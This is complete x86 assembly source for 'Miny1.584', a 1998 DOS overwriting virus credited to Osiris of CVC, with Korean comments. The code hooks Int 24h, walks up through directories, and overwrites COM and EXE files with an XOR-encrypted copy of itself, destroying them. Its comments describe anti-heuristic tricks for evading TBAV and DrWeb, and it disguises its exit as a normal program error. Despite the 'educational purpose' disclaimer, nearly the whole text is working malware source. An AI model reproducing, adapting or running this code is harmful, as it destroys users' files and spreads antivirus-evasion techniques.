;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                                              \\\\\\\  \       \  \
;     Miny1.584                               \          \     \   \
;                 by Osiris / CVC             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
;
;
; Name : Miny1.584
; AV Name : Miny, MinyO, KOV.Mini1
; Original Author : KOV of SVS
; Author : Osiris of CVC
; Origin : Corea
; Date : 1998/01/02
; Type : Non Resident  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 말라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
; Miny1.399 바이러스의 개선판이다.
; Anti-Heuristic 을 사용해서 인공지능 검색에서도 진단되지 않는다.
; 하지만, 간혹 EXE 파일을 감염시켰을 경우 확장자와 파일 구조가 틀려서 의심스럽다
; 고 진단되기도 한다. 이건 겹쳐쓰기형 바이러스 이므로 어쩔 수가 없다.
;
; AV Test : 진단 안됨
; Heuristic Test : 진단 안됨
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org    100h

 Entry:        call   Anti_TBAV                 ; TBAV 진단 방해 & 암호 풀기

 Encry_Start:
               mov    byte ptr S_Find,0FFh      ; COM 감염인가, EXE 감염인가
               mov    byte ptr Total,00         ; 3개 감염
               mov    byte ptr Infected,00      ; 감염된 갯수를 0 으로 한다.
               Jmp    Virus_Start               ; 파일 찾기로 점프

;
; 데이터 값 영역
;

 Vir_Msg       db ' [Miny1]  from Corean Virus Factory !',0Dh,0Ah
               db ' Anti-Heuristic Version / FREEWARE  98/01/02',0Dh,0Ah
               db ' (c) Copyleft 1991-95 by KOV of SVS,Corea',0Dh,0Ah
               db ' (c) Copyleft 1997-98 by Osiris of CVC,Corea',0Dh,0Ah
               db ' Thanx to MOV of SVS !$'

 Msg           DB     'Abnormal Program Termination.',0Dh,0Ah,'$'

 Total         DB     ?                         ; 감염시킨수
 Infected      DB     ?                         ; 지금까지 감염된 파일들
 S_Find        DB     ?                         ; 감염시키고 있는 상태
 UP            DB     '..',00                   ; 상위로 이동

 Virus_Start:
               xor    ax,ax
               mov    ds,ax
               mov    bx,0090h
               push   DS:[BX]                   ; Int 24h 값 저장
               Push   DS:[BX+2]

               mov    DS:[BX],offset NewInt24
               mov    DS:[BX+2h],cs             ; Int 24h 가로챔

               Push   CS                        ; cs=ds
               Pop    DS

               mov    word ptr Target_File, '.*'; *. 저장
                                                ; 아무 값이나 파일 찾기
                                                ; Anti-Heuristic for DrWeb
 Find_File:
               Mov    ah, (4Eh xor 12h)
               Mov    cx,00100011B              ; 파일 속성
               mov    dx, offset Target_File
 Find:         xor    ah,12h
               Int    21h                       ; 첫 파일 찾기는 실패가된다.
               Jnc    ChkInfect                 ; 에러?
               jmp    Check_S_Find
 ChkInfect:
               mov    ax, DS:[0080h+1Eh]
               cmp    ax,'OC'                   ; COMMAND.COM 인가 ?
               jnz    InfectFile                ; 감염 제외

 Find_NEXT:
               Mov    ah, (4Fh xor 12h)         ; 다음 파일 검사
               JMP    Find                      ;

 InfectFile:
               mov    ax,0143h                  ; 속성을 읽기/쓰기로 만든다.
               xor    cx,cx                     ; DTA 가 0080h 부터 시작하므로
               mov    dx,0080h
               add    dl,1Eh                    ; DX=009Eh
               xchg   ah,al
               int    21h
               jc     Stop_Virus

               mov    ax,023Dh                  ; 오픈/쓰기로 오픈
               xchg   ah,al                     ; AX=3D02h
               int    21h
               jc     Stop_Virus

               xchg   ax,bx                     ; AX 에 핸들 넣기
               mov    ax,(5700h xor 5700h)      ; 시간 얻기
               xor    ax,5700h
               int    21h
               push   cx
               push   dx

               mov    ah,3Fh                    ; 앞부분 읽어 들이기
               mov    cx,0001
               mov    dx, offset Buffer
               int    21h

               mov    ax,4200h
               xor    cx,cx
               xor    dx,dx
               int    21h

               cmp    byte ptr Buffer, 0E8h     ; 감염되었나 ?
               jnz    Get_Key_Value
               inc    byte ptr INFECTED         ; 감염된 파일 갯수
               jmp    Restore_File_DT

 Get_Key_Value:
               xor    ax,ax                     ; 임의의 시간 얻기 (암호화
               mov    es,ax                     ; 에 사용)
               mov    al,byte ptr ES:[046Ch]    ; 0000:046Ch
               Push   CS                        ; cs=es
               Pop    ES                        ;
               mov    Key_Value,al              ; Key_Value = 암호키 값
               call   Write_Vir                 ; 바이러스 쓰기 호출
               Inc    byte ptr Total            ; 1 증가

 Restore_File_DT:
               pop    dx                        ; 시간 복구
               pop    cx
               mov    ax,0157h                  ; 시간 조정(원래 시간)
               xchg   ah,al                     ; AX=5701h
               int    21h

               mov    ah,3eh                    ; 파일 닫기
               Int    21h

               cmp    byte ptr Total,3          ; 3개 감염시켰나?
               jz     Stop_Virus
               JMP    Find_NEXT

 Stop_Virus:
               xor    ax,ax                     ; 원래 Int 24h 로 바꿈
               mov    ds,ax
               mov    bx,0090h
               pop    DS:[BX+2]
               pop    DS:[BX]
               Push   CS
               Pop    DS
               mov    dx, offset Msg            ; 정상적인 에러로 가장
               cmp    byte ptr Infected,15      ; 15개이상 감염된 파일이 있으면
               jb     PrtMsg                    ; 메시지 출력

               mov    dx, offset Vir_Msg
 PrtMsg:       mov    ah,9                      ; 메시지 출력
               Int    21h

               Mov    ax,4CFFh                  ; 바이러스 종료
               int    21h


 Check_S_Find:
               cmp    byte ptr S_Find, 0FFh     ; 아무 파일이나 찾았는가 ?
               jnz    Check_Find_com
 Find_Com:
               mov    byte ptr S_Find, 0        ; COM 파일 부터 감염
               mov    word ptr Target_File+2,'oc'
               mov    byte ptr Target_File+4,'m'
               mov    byte ptr Target_File+5, 0 ; *.com
               jmp    Find_File

 Check_Find_com:
               cmp    byte ptr S_Find,1         ; 01이면 EXE 파일도 감염시켰다.
               Jnz    DX_EXE
               mov    dx, offset UP             ; 상위 디렉토리로 이동
               mov    ah, 3Bh
               Int    21h
               jc     Stop_Virus                ; 루트 디렉토리 인가 ?
               jmp    Find_Com
 DX_EXE:
               Mov    byte ptr S_Find,1         ; EXE 파일을 감염시켜라.
               mov    word ptr Target_File+2,'xe';
               mov    byte ptr Target_File+4,'e'
               mov    byte ptr Target_File+5, 0 ; *.exe
               Jmp    Find_File

 NewInt24:                                      ; Int 24h 처리
               xor    al,al
               IRET

 End_Encry:

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;             바이러스 암호화 부분
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Write_Vir:    call   Decode                    ; 암호화
               mov    ah, 3Fh                   ; 바이러스 쓰기
               inc    ah                        ; AH=40h
               mov    dx, 100h                  ;
               mov    cx, offset Vir_END - 100h ;
               Int    21h
               call   Decode                    ; 암호 해제
               RET
 Key_Value     DB     ?

 Anti_TBAV:
               cmp    al,100                    ; Thanx ! MOV !
               je     Decode                    ; TBAV 의 '#' 플래그가 발생하지
               inc    al                        ; 않는다.
               loop   Anti_TBAV                 ;
 Decode:
               mov    di, offset Encry_Start    ; 암호 시작점
               mov    ah, Key_value
               mov    si,di
               mov    cx, offset End_Encry - Encry_Start
 E_Ing:
               lodsb                            ; 암호화
               xor    al,ah
               stosb
               loop   E_ing
               RET
 Vir_END:

 Target_File   db     0,0,0,0,0,0               ; 감염을 시킬 파일 확장자
 Buffer        db     ?

 Miny1         ENDS
               END    Entry
